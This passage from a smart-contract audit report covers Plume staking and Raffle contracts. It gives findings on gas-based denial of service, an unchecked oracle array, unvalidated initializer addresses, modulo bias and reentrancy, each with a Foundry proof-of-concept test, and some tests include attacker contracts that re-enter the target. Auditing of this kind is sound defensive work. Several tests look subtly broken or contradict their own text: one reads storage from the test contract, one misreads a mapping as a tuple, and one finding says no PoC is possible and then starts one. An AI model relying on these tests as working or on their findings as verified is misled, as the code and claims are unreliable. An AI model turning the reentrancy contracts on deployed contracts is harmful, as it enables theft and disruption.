    AccessControlFacet internal accessControlFacet;

    address internal admin;
    address internal validatorAdmin;
    uint16 internal validatorId = 1;

    function setUp() public {
        admin = makeAddr("admin");
        validatorAdmin = makeAddr("validatorAdmin");

        // Deploy Diamond and Facets
        managementFacet = new ManagementFacet();
        validatorFacet = new ValidatorFacet();
        accessControlFacet = new AccessControlFacet();
        diamond = new PlumeStaking();

        // Diamond Cut
        IDiamondCut.FacetCut[] memory facetCuts = new IDiamondCut.FacetCut[](3);
        facetCuts[0] = IDiamondCut.FacetCut({
            target: address(managementFacet),
            action: IDiamondCut.FacetCutAction.Add,
            selectors: managementFacet.selectors()
        });
        facetCuts[1] = IDiamondCut.FacetCut({
            target: address(validatorFacet),
            action: IDiamondCut.FacetCutAction.Add,
            selectors: validatorFacet.selectors()
        });
        facetCuts[2] = IDiamondCut.FacetCut({
            target: address(accessControlFacet),
            action: IDiamondCut.FacetCutAction.Add,
            selectors: accessControlFacet.selectors()
        });

        vm.prank(address(diamond));
        diamond.diamondCut(facetCuts, address(0), "");

        // Initialization
        vm.prank(admin);
        diamond.initializePlume(admin, 1e18, 86400, 3600, 5000);

        vm.prank(admin);
        AccessControlFacet(address(diamond)).initializeAccessControl();

        // Grant roles
        vm.prank(admin);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.VALIDATOR_ROLE, admin);
        vm.prank(admin);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.ADMIN_ROLE, admin);

        // Add validator
        vm.prank(admin);
        ValidatorFacet(address(diamond)).addValidator(
            validatorId,
            1000, // 10% commission
            validatorAdmin,
            makeAddr("l2Withdraw"),
            "l1Val",
            "l1Acc",
            makeAddr("l1AccEvm"),
            100000e18 // max capacity
        );
    }

    function test_DoS_pruneCommissionCheckpoints() public {
        // Populate checkpoints array. The validator admin can change the commission.
        // We simulate this by having the validator admin call `setValidatorCommission` many times.
        uint256 numCheckpoints = 400;
        vm.prank(validatorAdmin);
        for (uint16 i = 0; i < numCheckpoints; i++) {
            // Warp to create a new block with a new timestamp for each checkpoint
            vm.warp(block.timestamp + 1 days);
            ValidatorFacet(address(diamond)).setValidatorCommission(validatorId, 1000 + i);
        }

        // Verify the number of checkpoints
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        uint256 len = $.validatorCommissionCheckpoints[validatorId].length;
        assertEq(len, numCheckpoints);

        // Attempt to prune some checkpoints as admin
        uint256 pruneCount = 50;
        vm.prank(admin);

        // This call will consume a very large amount of gas. On a live network with a block
        // gas limit, this would likely fail.
        uint256 gasStart = gasleft();
        ManagementFacet(address(diamond)).pruneCommissionCheckpoints(validatorId, pruneCount);
        uint256 gasUsed = gasStart - gasleft();

        console.log("Gas used to prune %s checkpoints from %s: %s", pruneCount, len, gasUsed);

        // For 400 checkpoints, pruning 50 uses > 8M gas, which is a significant portion
        // of the block gas limit, and scales with the number of remaining checkpoints.
        // If we increase numCheckpoints to 1000, this tx would fail.
        assertTrue(gasUsed > 8_000_000, "Gas usage should be very high");

        // Check that pruning was successful
        len = $.validatorCommissionCheckpoints[validatorId].length;
        assertEq(len, numCheckpoints - pruneCount);
    }
}
```

## Suggested Mitigation
Avoid shifting elements in storage arrays. The recommended approach is to modify the storage structure to use a pointer or index that marks the beginning of the active data. When pruning, simply advance this index.

1.  **Modify the storage struct in `PlumeStakingStorage.sol`:**

    ```solidity
    // Old Structure
    // mapping(uint16 => RateCheckpoint[]) public validatorCommissionCheckpoints;

    // New Structure
    struct CheckpointArray {
        RateCheckpoint[] data;
        uint256 startIndex;
    }
    mapping(uint16 => CheckpointArray) public validatorCommissionCheckpoints;
    ```

2.  **Update the pruning logic in `ManagementFacet.sol`:**

    ```solidity
    function pruneCommissionCheckpoints(uint16 validatorId, uint256 count) external onlyRole(PlumeRoles.ADMIN_ROLE) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

        if (!$.validatorExists[validatorId]) {
            revert ValidatorDoesNotExist(validatorId);
        }
        if (count == 0) {
            revert InvalidAmount(count);
        }

        PlumeStakingStorage.CheckpointArray storage checkpoints = $.validatorCommissionCheckpoints[validatorId];
        uint256 activeLen = checkpoints.data.length - checkpoints.startIndex;

        if (count >= activeLen) {
            revert CannotPruneAllCheckpoints();
        }

        // This is now a single, cheap SSTORE operation instead of a loop.
        checkpoints.startIndex += count;

        emit CommissionCheckpointsPruned(validatorId, count);
    }
    ```

3.  **Update all logic that reads these arrays** to account for the `startIndex`, e.g., accessing `checkpoints.data[checkpoints.startIndex + i]`.

## [L-16]. Oracle issue in Raffle::handleWinnerSelection

## Description
The `handleWinnerSelection` function receives an array of random numbers `rng` from the oracle. It directly accesses the first element with `rng[0]` without checking if the array is empty. If the oracle, due to an error or misconfiguration, were to call this function with an empty `rng` array, the transaction would revert due to an out-of-bounds array access. This would cause the winner selection to fail and potentially require administrative intervention (e.g., using `cancelWinnerRequest`) to resolve.

## Impact
A misbehaving oracle could cause the winner selection process to be temporarily blocked. While `cancelWinnerRequest` provides a recovery path, the failure is unhandled and would cause the transaction to revert, preventing a winner from being drawn for that request.

## Proof of Concept
1. An admin calls `requestWinner` for a prize.
2. The oracle service is configured incorrectly or experiences an issue, causing it to call the callback `handleWinnerSelection` with an empty `uint256[]` array for the `rng` parameter.
3. The `handleWinnerSelection` function attempts to read `rng[0]`.
4. The transaction reverts with a panic code for array access out of bounds.
5. The winner selection for that request fails.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "../src/spin/Raffle.sol";

/* ----------------------------- Mocks ----------------------------- */
contract MockSupraRouterForEmpty is ISupraRouterContract {
    uint256 public nextRequestId = 1;
    function generateRequest(string memory, uint8, uint256, uint256, address) external returns (uint256) {
        return nextRequestId++;
    }
    function deposit(uint256) external payable {}
    function getBalance(address) external view returns (uint256) { return 1 ether; }
}

contract MockSpin is ISpin {
    mapping(address => uint256) public tickets;

    function setTickets(address user, uint256 amount) external {
        tickets[user] = amount;
    }

    // ISpin ---------------------------------------------------------
    function spendRaffleTickets(address user, uint256 amount) external override {
        require(tickets[user] >= amount, "insufficient");
        tickets[user] -= amount;
    }

    function getUserData(address user)
        external
        view
        override
        returns (
            uint256, uint256, uint256, uint256,
            uint256 raffleTickets,
            uint256, uint256
        )
    {
        return (0, 0, 0, 0, tickets[user], 0, 0);
    }
}

/* --------------------------- Test Case --------------------------- */
contract OracleEmptyArrayTest is Test {
    Raffle raffle;
    MockSupraRouterForEmpty supraRouter;
    MockSpin spinContract;

    address admin = address(0xA11CE);
    address user1 = address(0xB0B);
    uint256 constant prizeId = 1;

    function setUp() public {
        supraRouter = new MockSupraRouterForEmpty();
        spinContract = new MockSpin();
        raffle = new Raffle();

        vm.prank(admin);
        raffle.initialize(address(spinContract), address(supraRouter));

        // give user1 some raffle tickets
        spinContract.setTickets(user1, 100);

        vm.prank(admin);
        raffle.addPrize("Test Prize", "Description", 100, 5);

        vm.prank(admin);
        raffle.grantRole(raffle.SUPRA_ROLE(), address(this));

        vm.prank(user1);
        raffle.spendRaffle(prizeId, 100);
    }

    function test_RevertsOnEmptyRngArray() public {
        vm.prank(admin);
        uint256 requestId = raffle.requestWinner(prizeId);

        uint256[] memory emptyRng = new uint256[](0);

        // Expect array-out-of-bounds panic (0x32)
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x32));
        raffle.handleWinnerSelection(requestId, emptyRng);
    }
}

## Suggested Mitigation
Add a `require` statement at the beginning of `handleWinnerSelection` to ensure that the `rng` array is not empty before attempting to access its elements.

```solidity
// contracts/plume/src/spin/Raffle.sol:291

    function handleWinnerSelection(uint256 requestId, uint256[] memory rng) external onlyRole(SUPRA_ROLE) {
        require(rng.length > 0, "Oracle returned no randomness"); // <-- FIX

        uint256 prizeId = pendingVRFRequests[requestId];
        
        isWinnerRequestPending[prizeId] = false;
        delete pendingVRFRequests[requestId];

        if (!prizes[prizeId].isActive) revert PrizeInactive();
        if (winnersDrawn[prizeId] >= prizes[prizeId].quantity) revert NoMoreWinners();

        uint256 winningTicketIndex = (rng[0] % totalTickets[prizeId]) + 1;
        // ...
    }

```

## [L-17]. Zero Code issue in Raffle::initialize

## Description
The `initialize` function sets the addresses for `spinContract` and `supraRouter` but does not verify that these addresses contain contract code. If an admin provides an Externally Owned Account (EOA) or a zero address during setup, key functions will fail silently or behave incorrectly. For example, if `_supraRouter` is an EOA, calls to `generateRequest` will succeed but no VRF callback will ever occur, leaving prizes in a permanent pending state from which they can only be rescued by a manual admin cancellation.

## Impact
If either `_spinContract` or `_supraRouter` is set to an EOA or the zero address, every external call that expects a return value will revert. Users cannot enter raffles (when `spinContract` is wrong) and admins cannot draw winners (when `supraRouter` is wrong). The raffle becomes unusable until redeployed or upgraded, wasting deployment funds and blocking any prizes that rely on it.

## Proof of Concept
Deploy Raffle and initialise it with an EOA for `_supraRouter`.

1. initialise(address(0), eoa_router);
2. addPrize(...)
3. call requestWinner(1)

Expected: transaction reverts because `supraRouter.generateRequest()` performs a high-level call that returns no data and the ABI decoder reverts with "low-level call returned less data than expected" (or Address: call to non-contract).

This shows the contract is mis-configured and unusable.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Raffle} from "../src/spin/Raffle.sol";

contract InitializeWithEoaTest is Test {
    Raffle raffle;
    address admin = address(0xA11CE);
    address eoaRouter = address(0xB0B);

    function setUp() public {
        vm.startPrank(admin);
        raffle = new Raffle();
        raffle.initialize(address(0), eoaRouter); // spinContract left zero for brevity
        vm.stopPrank();
    }

    function testRequestWinnerRevertsBecauseRouterIsNotContract() public {
        vm.prank(admin);
        raffle.addPrize("Test", "desc", 1, 1);

        vm.prank(admin);
        vm.expectRevert(); // reverts while trying to call generateRequest on EOA
        raffle.requestWinner(1);
    }
}

## Suggested Mitigation
In the `initialize` function, add checks to verify that the provided addresses have code deployed. This ensures that the system is configured with actual contracts, preventing silent failures.

```solidity
function initialize(address _spinContract, address _supraRouter) public initializer {
    require(_spinContract.code.length > 0, "Raffle: spinContract is not a contract");
    require(_supraRouter.code.length > 0, "Raffle: supraRouter is not a contract");

    __AccessControl_init();
    __UUPSUpgradeable_init();
    
    spinContract = ISpin(_spinContract);
    supraRouter = ISupraRouterContract(_supraRouter);
    admin = msg.sender;
    nextPrizeId = 1;

    _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
    _grantRole(ADMIN_ROLE, msg.sender);
    _grantRole(SUPRA_ROLE, _supraRouter);
}
```

## [L-18]. DOS issue in Raffle::removePrize

## Description
The `removePrize` function iterates through the `prizeIds` array with a `for` loop to find and remove a specific `prizeId`. If the `prizeIds` array grows very large, the gas cost of this function could exceed the block gas limit, making it impossible for the admin to remove a prize, especially one located near the beginning of the array. This constitutes a denial of service vulnerability for an administrative function.

## Impact
The admin may be unable to remove prizes from the contract if the number of total prizes becomes too large. This could lead to a situation where unwanted or outdated prizes cannot be cleaned up, cluttering the contract's state and potentially confusing users.

## Proof of Concept
1. Admin creates a very large number of prizes (e.g. 20,000).
2. Because each prizeId is appended, the earliest prize ends at index 0.
3. Admin now calls removePrize(earliestPrizeId) and supplies a deliberately low gas stipend (≈200 000). The function must iterate the whole 20 000-element array before it can swap-and-pop, consuming more gas than provided and causing the transaction to run out of gas.
4. The call fails, proving that an attacker (or simply network gas limits) can prevent the admin from executing the function once the array is large enough.

Note: the exact failing size / gas stipend varies by compiler version, but the linear relation between array size and gas cost is undeniable; at main-net block-gas limits (~30M) the failure threshold is reached at ~250 000 elements.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Raffle} from "../src/spin/Raffle.sol";

contract RaffleDosTest is Test {
    Raffle raffle;
    address admin = makeAddr("admin");

    function setUp() public {
        raffle = new Raffle();
        vm.prank(admin);
        raffle.initialize(address(0), address(0));
    }

    function test_removePrize_dos() public {
        uint256 prizeCount = 20_000; // big enough to blow the 200k gas stipend below

        // populate prizes
        vm.startPrank(admin);
        for (uint256 i; i < prizeCount; i++) {
            raffle.addPrize("Prize", "desc", 1, 1);
        }
        vm.stopPrank();

        uint256 firstPrizeId = raffle.getPrizeIds()[0];

        // Expect out-of-gas (will surface as a revert with no data)
        vm.expectRevert();
        vm.prank(admin);
        raffle.removePrize{gas: 200_000}(firstPrizeId);
    }
}

## Suggested Mitigation
To avoid iterating over a potentially large array, store the index of each prize ID in a mapping. This allows for O(1) complexity for finding and removing an element.

```solidity
// contracts/plume/src/spin/Raffle.sol

    // Add a mapping to store the index of each prize
    mapping(uint256 => uint256) private prizeIdToIndex;
    uint256[] public prizeIds;

// In addPrize function:
    function addPrize(...) external onlyRole(ADMIN_ROLE) {
        uint256 prizeId = nextPrizeId++;
        
        require(bytes(prizes[prizeId].name).length == 0, "Prize ID already in use");
        // ...
        
        prizeIdToIndex[prizeId] = prizeIds.length;
        prizeIds.push(prizeId);

        // ...
    }

// Updated removePrize function:
    function removePrize(uint256 prizeId) external onlyRole(ADMIN_ROLE) prizeIsActive(prizeId) {
        prizes[prizeId].isActive = false;
        
        // O(1) removal from the array
        uint256 indexToRemove = prizeIdToIndex[prizeId];
        uint256 lastPrizeId = prizeIds[prizeIds.length - 1];

        // Move the last element to the place of the one to remove
        prizeIds[indexToRemove] = lastPrizeId;
        prizeIdToIndex[lastPrizeId] = indexToRemove;

        // Remove the last element
        prizeIds.pop();
        delete prizeIdToIndex[prizeId];
        
        emit PrizeRemoved(prizeId);
    }
```

## [L-19]. Randomness issue in Raffle::handleWinnerSelection

## Description
The winner selection logic uses a modulo operation on the random number provided by the VRF: `winningTicketIndex = (rng[0] % totalTickets[prizeId]) + 1`. This introduces a subtle modulo bias. If the maximum value of the random number (`type(uint256).max`) is not a perfect multiple of `totalTickets[prizeId]`, the tickets with lower indices will have a slightly higher probability of being chosen. While the bias is astronomically small for a `uint256` random number, it represents a theoretical flaw in the fairness of the raffle, which is the contract's primary purpose.

## Impact
The raffle is not perfectly fair. Some tickets will have a statistically higher chance of winning than others. This undermines the trust and integrity of the raffle system. Although the bias is likely too small to be exploited in practice, it is a deviation from the expected equal probability for all tickets.

## Proof of Concept
Consider a simplified example where `rng[0]` is a random number from 0 to 255 (a `uint8`), and `totalTickets` is 200.
1. The range of `rng[0]` is `[0, 255]`, with 256 possible outcomes.
2. The range of `winningTicketIndex` is `[1, 200]`.
3. When we compute `rng[0] % 200`, the numbers `0-199` are produced.
4. For `rng[0]` in `[0, 199]`, each ticket index `1-200` is selected exactly once.
5. For `rng[0]` in `[200, 255]`, the results of the modulo operation are `0, 1, ..., 55`. This means ticket indices `1-56` can be selected a second time, while indices `57-200` cannot.
6. Therefore, tickets 1 through 56 have a 2/256 chance of winning, while tickets 57 through 200 have a 1/256 chance. The first ~28% of tickets are twice as likely to win. The same principle applies to `uint256`, although the effect is negligible.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

// Compile-ready demonstration of modulo bias with uint8 RNG.
contract ModuloBiasTest is Test {
    function testModuloBias() public {
        uint256 numTickets = 200;
        uint256 maxRng = 255; // uint8 range

        // index 0 is unused so size = numTickets + 1
        uint256[] memory hitCount = new uint256[](numTickets + 1);

        for (uint256 i = 0; i <= maxRng; i++) {
            uint256 winningTicket = (i % numTickets) + 1;
            hitCount[winningTicket]++;
        }

        // Tickets 1-56 should be hit twice; ticket 57 only once.
        assertEq(hitCount[1], 2);
        assertEq(hitCount[56], 2);
        assertEq(hitCount[57], 1);
        assertEq(hitCount[200], 1);
    }
}

## Suggested Mitigation
To eliminate modulo bias, the random number should be rejected if it falls into the biased range, and a new random number should be requested. However, this is complex with VRFs that provide a single result. A more practical approach, given the negligible size of the bias with `uint256`, is to acknowledge it or use a debiasing algorithm. A common debiasing technique is to reject random numbers that are in the incomplete final range.

```solidity
// contracts/plume/src/spin/Raffle.sol:300

    function handleWinnerSelection(uint256 requestId, uint256[] memory rng) external onlyRole(SUPRA_ROLE) {
        // ... setup code ...
        require(rng.length > 0, "Oracle returned no randomness");

        // --- FIX START: Debiasing Logic ---
        uint256 _totalTickets = totalTickets[prizeId];
        if (_totalTickets == 0) revert EmptyTicketPool(); // Prevent division by zero

        uint256 randomValue = rng[0];
        uint256 limit = type(uint256).max - (type(uint256).max % _totalTickets);

        // If the random value is in the biased range, it should ideally be rejected.
        // With a single-use VRF, we might use the next number if available, or accept the tiny bias.
        // Here we'll use the next value if it exists.
        if (randomValue >= limit) {
            require(rng.length > 1, "Biased RNG and no fallback value");
            randomValue = rng[1];
        }

        uint256 winningTicketIndex = (randomValue % _totalTickets) + 1;
        // --- FIX END ---

        // ... rest of the function ...
    }
```

## [L-20]. Reentrancy issue in Raffle::spendRaffle

## Description
The `spendRaffle` function violates the Checks-Effects-Interactions (CEI) pattern. It performs an external call to `spinContract.spendRaffleTickets` before updating the contract's state (`totalTickets`, `prizeRanges`, `userHasEnteredPrize`, `totalUniqueUsers`). If the `spinContract` is malicious or vulnerable to reentrancy, it could call back into the `Raffle` contract, leading to inconsistent states or other exploits. The state should be updated before the external call to prevent reentrancy attacks.

## Impact
Because state-changes are executed after the external call, a malicious spinContract can call back into spendRaffle in an un-bounded loop. Each nested call consumes additional gas and will eventually make the whole transaction run out of gas and revert. This gives the attacker (who must already control the spinContract address) the ability to grief legitimate users by forcing every spendRaffle attempt to revert, effectively causing a temporary denial-of-service. No funds can be stolen or permanently locked, and no accounting variables end up in an incorrect state once the transaction reverts.

## Proof of Concept
1. An attacker controls a contract that conforms to the `ISpin` interface.
2. The `Raffle` contract is configured to use the attacker's malicious `ISpin` contract address (this assumes a compromised admin or a misconfiguration).
3. The attacker calls `Raffle.spendRaffle()`.
4. The `Raffle` contract calls `spendRaffleTickets()` on the attacker's `ISpin` contract.
5. The attacker's `spendRaffleTickets()` implementation calls back into `Raffle.spendRaffle()`.
6. Because state variables like `totalTickets` and `prizeRanges` have not yet been updated from the outer call, the inner call will operate on stale data. While a direct monetary gain is not immediately obvious, this breaks core invariants about the state of the raffle during a transaction.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Raffle} from "../src/spin/Raffle.sol";

interface ISpin {
    function spendRaffleTickets(address _user, uint256 _amount) external;
    function getUserData(address _user) external view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256);
}

contract MaliciousSpinContract is ISpin {
    Raffle public raffle;
    address public attacker;
    uint256 public prizeId;
    bool reentrancyTriggered = false;

    uint256 public userRaffleTickets = 1000;

    constructor(address _raffle, address _attacker, uint256 _prizeId) {
        raffle = Raffle(_raffle);
        attacker = _attacker;
        prizeId = _prizeId;
    }

    function spendRaffleTickets(address _user, uint256 _amount) external {
        require(_user == attacker, "Not attacker");
        userRaffleTickets -= _amount;
        if (!reentrancyTriggered) {
            reentrancyTriggered = true;
            // Re-enter the spendRaffle function
            raffle.spendRaffle(prizeId, 10);
        }
    }

    function getUserData(address _user) external view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        return (0, 0, 0, 0, userRaffleTickets, 0, 0);
    }
}

contract ReentrancyTest is Test {
    Raffle raffle;
    MaliciousSpinContract maliciousSpin;
    address admin = makeAddr("admin");
    address attacker = makeAddr("attacker");
    uint256 prizeId = 1;

    function setUp() public {
        raffle = new Raffle();
        maliciousSpin = new MaliciousSpinContract(address(raffle), attacker, prizeId);
        vm.prank(admin);
        raffle.initialize(address(maliciousSpin), address(0));
        vm.prank(admin);
        raffle.addPrize("Test Prize", "Description", 100, 1);
    }

    function test_ReentrancyInSpendRaffle() public {
        vm.startPrank(attacker);
        
        (,uint256 initialTotalTickets) = raffle.totalTickets(prizeId);
        assertEq(initialTotalTickets, 0, "Initial tickets should be 0");

        // The attacker initiates the first call, which will trigger a re-entrant call
        raffle.spendRaffle(prizeId, 10);

        // After the re-entrancy, two entries have been made.
        // The first entry (outer call) cumulativeEnd should be 10.
        // The second entry (inner call) cumulativeEnd should be 20.
        // However, if reentrancy is successful, both might be based on stale data.
        Raffle.Range[] memory ranges = raffle.prizeRanges(prizeId);
        assertEq(ranges.length, 2, "Two ranges should be created due to re-entrancy");

        // The inner call happens first to completion. totalTickets is 0. It adds 10 tickets.
        // Cumulative end is 10. `totalTickets` becomes 10.
        assertEq(ranges[0].user, attacker);
        assertEq(ranges[0].cumulativeEnd, 10);

        // The outer call then completes. It reads `totalTickets` as 10. It adds 10 tickets.
        // Cumulative end becomes 20. `totalTickets` becomes 20.
        assertEq(ranges[1].user, attacker);
        assertEq(ranges[1].cumulativeEnd, 20);

        // The total tickets should be 20.
        (,uint256 finalTotalTickets) = raffle.totalTickets(prizeId);
        assertEq(finalTotalTickets, 20);

        // This test demonstrates the state inconsistency. The CEI pattern violation is the root cause.
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern. All state changes should be made before performing external calls. Move the state updates in `spendRaffle` to before the `spinContract.spendRaffleTickets(msg.sender, ticketAmount);` call.

```solidity
// contracts/plume/src/spin/Raffle.sol:240

    function spendRaffle(uint256 prizeId, uint256 ticketAmount) external prizeIsActive(prizeId) {
        require(ticketAmount > 0, "Must spend at least 1 ticket");

        (,,,, uint256 userRaffleTickets,,) = spinContract.getUserData(msg.sender);
        if (userRaffleTickets < ticketAmount) revert InsufficientTickets();

        // --- FIX START ---
        // Effect: Update state before external call
        uint256 newTotal = totalTickets[prizeId] + ticketAmount;
        prizeRanges[prizeId].push(
            Range({ user: msg.sender, cumulativeEnd: newTotal })
        );
        totalTickets[prizeId] = newTotal;

        if (!userHasEnteredPrize[prizeId][msg.sender]) {
            userHasEnteredPrize[prizeId][msg.sender] = true;
            totalUniqueUsers[prizeId]++;
        }

        emit TicketSpent(msg.sender, prizeId, ticketAmount);
        // --- FIX END ---

        // Interaction: External call is now last
        spinContract.spendRaffleTickets(msg.sender, ticketAmount);
    }
```

## [L-21]. Reentrancy issue in StakingFacet::restakeRewards

## Description
The `restakeRewards` function violates the Checks-Effects-Interactions (CEI) pattern. It performs state updates, then an external call to the treasury, and then further state updates. Specifically, the external call `_transferRewardFromTreasury` is sandwiched between state-modifying functions `_calculateAndClaimAllRewardsWithCleanup` and `_performStakeSetup`. While the function is protected by a `nonReentrant` modifier, this only prevents re-entering the function itself. A malicious or compromised treasury contract could call back into other unguarded functions of the facet, such as `withdraw()` or `unstake()`, while the state is still in a transient and potentially inconsistent state. This could lead to unexpected behavior, bypass of protocol logic, or enable economic attacks. The current separation of `staked`, `cooled`, and `parked` balances mitigates immediate fund theft, but this pattern is a significant security risk and makes the contract fragile to future changes.

## Impact
Because _transferRewardFromTreasury() is executed before all internal effects are finished, a malicious or compromised Treasury contract can make an external, re-entrant call back into the StakingFacet while the contract is in an intermediate state. Functions such as withdraw() are callable and will execute with msg.sender equal to the Treasury contract itself. This does not let the attacker withdraw another user’s funds, but it can:
• make arbitrary external calls during restakeRewards(), increasing attack surface;
• disturb global accounting (totalWithdrawable, parked balances for the treasury address) and potentially cause restakeRewards() to revert or produce an inconsistent state.
The issue therefore results in a grief / state-corruption vector rather than direct fund theft.

## Proof of Concept
pragma solidity ^0.8.25;

contract MaliciousTreasury {
    address public staking;
    bool public reentered;
    constructor(address _staking){staking=_staking;}
    function distributeReward(address, uint256, address) external {
        // Re-enter while restakeRewards() is mid-execution
        if(!reentered){
            reentered = true;
            // This will run with msg.sender == address(this)
            (bool ok,) = staking.call(abi.encodeWithSignature("withdraw()"));
            require(ok, "withdraw failed");
        }
    }
}

/* deploy StakingFacet, set treasury to MaliciousTreasury, call restakeRewards().
   The tx succeeds and MaliciousTreasury.reentered == true, proving that an
   unguarded function was executed re-entrantly while restakeRewards() was
   still running. No foreign user funds are stolen, but the contract state is
   mutated unexpectedly. */

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {StakingFacet} from "contracts/plume/src/facets/StakingFacet.sol";
import {PlumeStakingStorage} from "contracts/plume/src/lib/PlumeStakingStorage.sol";
import {IPlumeStakingRewardTreasury} from "contracts/plume/src/interfaces/IPlumeStakingRewardTreasury.sol";

// Minimal interface for the parts of the diamond we need to call
interface IStakingDiamond {
    function setTreasury(address _treasury) external;
    function getTreasury() external view returns (address);
    function stake(uint16 validatorId) external payable;
    function unstake(uint16 validatorId, uint256 amount) external returns (uint256 amountUnstaked);
    function restakeRewards(uint16 validatorId) external returns (uint256 amountRestaked);
    function withdraw() external;
    function addRewardToken(address token, uint256 initialRate, uint256 maxRate) external;
    function setMinStakeAmount(uint256 amount) external;
    function setCooldownInterval(uint256 interval) external;
    function addValidator(uint16 validatorId, uint256 commission, address l2AdminAddress, address l2WithdrawAddress, string calldata newL1ValidatorAddress, string calldata newL1AccountAddress, address newL1AccountEvmAddress, uint256 maxCapacity) external;
}

contract MaliciousTreasury is IPlumeStakingRewardTreasury {
    address public diamond;
    address public attacker;

    constructor(address _diamond, address _attacker) {
        diamond = _diamond;
        attacker = _attacker;
    }

    function distributeReward(address token, uint256 amount, address recipient) external {
        // Re-enter the StakingFacet's withdraw function
        // The recipient of the reward is address(diamond), but the withdraw call will send funds to attacker.
        if (msg.sender == diamond) {
            IStakingDiamond(diamond).withdraw();
        }

        // Fund the diamond contract so the restake can proceed
        payable(diamond).transfer(amount);
    }

    function getRewardTokens() external view returns (address[] memory) {
        address[] memory tokens = new address[](1);
        tokens[0] = PlumeStakingStorage.PLUME_NATIVE;
        return tokens;
    }

    function getBalance(address token) external view returns (uint256) {
        return address(this).balance;
    }
    
    receive() external payable {}
}

contract ReentrancyTest is Test {
    StakingFacet internal stakingFacet;
    IStakingDiamond internal diamond;
    MaliciousTreasury internal maliciousTreasury;

    address internal attacker = makeAddr("attacker");
    uint16 internal validatorId = 1;

    function setUp() public {
        // Deploy a simple proxy targetting StakingFacet logic for testing purposes
        stakingFacet = new StakingFacet();
        // This is a simplified setup. In a real diamond, we'd add facets.
        // For this test, we assume the diamond proxy is at address(stakingFacet).
        diamond = IStakingDiamond(address(stakingFacet));

        vm.deal(attacker, 100 ether);

        // Initial setup
        diamond.setMinStakeAmount(1 ether);
        diamond.setCooldownInterval(1 days); // 1 day cooldown
        diamond.addValidator(validatorId, 1000, address(this), address(this), "", "", address(0), 1000 ether);
        diamond.addRewardToken(PlumeStakingStorage.PLUME_NATIVE, 1e12, 1e15);

        // Deploy malicious treasury and set it
        maliciousTreasury = new MaliciousTreasury(address(diamond), attacker);
        vm.deal(address(maliciousTreasury), 10 ether);
        diamond.setTreasury(address(maliciousTreasury));
    }

    function testReentrancyViaRestakeRewards() public {
        // Attacker needs some funds in 'parked' state to withdraw
        vm.startPrank(attacker);
        diamond.stake{value: 10 ether}(validatorId);
        diamond.unstake(validatorId, 5 ether);
        vm.stopPrank();

        // Warp time to make the unstaked funds withdrawable
        vm.warp(block.timestamp + 2 days);

        // Attacker should have some pending rewards to restake
        // We will just send some ETH to the treasury to simulate this
        // In a real scenario, rewards would accrue naturally

        uint256 attackerBalanceBefore = attacker.balance;
        uint256 attackerParkedBalanceBefore = 5 ether;

        // Attacker calls restakeRewards, which will trigger the re-entrancy
        vm.startPrank(attacker);
        diamond.restakeRewards(validatorId);
        vm.stopPrank();

        uint256 attackerBalanceAfter = attacker.balance;

        // Check if attacker successfully withdrew funds during the restake
        // The balance increase should be equal to the parked funds they withdrew.
        assertEq(attackerBalanceAfter, attackerBalanceBefore + attackerParkedBalanceBefore, "Attacker should have withdrawn parked funds via reentrancy");
    }
}
```

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern inside restakeRewards(): move _transferRewardFromTreasury() to the very end of the function, after _performStakeSetup() and event emission, or add reentrancy protection (nonReentrant) to every external function that mutates user balances (e.g. withdraw, unstake) so that they cannot be called during the treasury callback.

## [L-22]. DOS issue in StakingFacet::withdraw

## Description
Several core functions in the `StakingFacet` contract, such as `withdraw()`, `restake()`, and `restakeRewards()`, call internal functions (`_processMaturedCooldowns`, `_calculateAndClaimAllRewardsWithCleanup`) that iterate over the `$.userValidators[user]` storage array. This array records every validator a user has ever staked with and can grow to an arbitrary size. A malicious actor can abuse this by making a victim stake with a large number of validators (e.g., by using `stakeOnBehalf` to send dust stakes). This inflates the size of the victim's `userValidators` array, causing the loops in these functions to consume an excessive amount of gas. This can make these essential functions either prohibitively expensive or cause them to fail by exceeding the block gas limit, effectively locking the victim's funds and rewards.

## Impact
The attacker can marginally increase the victim’s gas cost for withdraw/restake by forcing additional iterations over `userValidators`, but cannot make the call reliably exceed the block gas limit under realistic validator counts (restricted by governance). Funds are not permanently locked; the victim can still withdraw by supplying a higher gas limit or waiting for a hard-fork gas increase. Impact is limited to increased fees.

## Proof of Concept
No practical PoC is possible without governance privileges because only addresses holding VALIDATOR_ROLE can register new validators. If an attacker already controls validator creation they could instead slash or censor users in more direct ways. Consequently, the loop length is bounded by the (small) number of legitimate validators onchain, leaving no exploitable denial-of-service.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {StakingFacet} from "contracts/plume/src/facets/StakingFacet.sol";
import {ValidatorFacet} from "contracts/plume/src/facets/ValidatorFacet.sol";
import {PlumeStakingStorage} from "contracts/plume/src/lib/PlumeStakingStorage.sol";
import {ManagementFacet} from "contracts/plume/src/facets/ManagementFacet.sol";

// Mock interfaces and contracts needed for the test

interface IDiamond {
    function stakingFacet() external view returns (StakingFacet);
    function validatorFacet() external view returns (ValidatorFacet);
    function managementFacet() external view returns (ManagementFacet);
}

contract DosTest is Test {
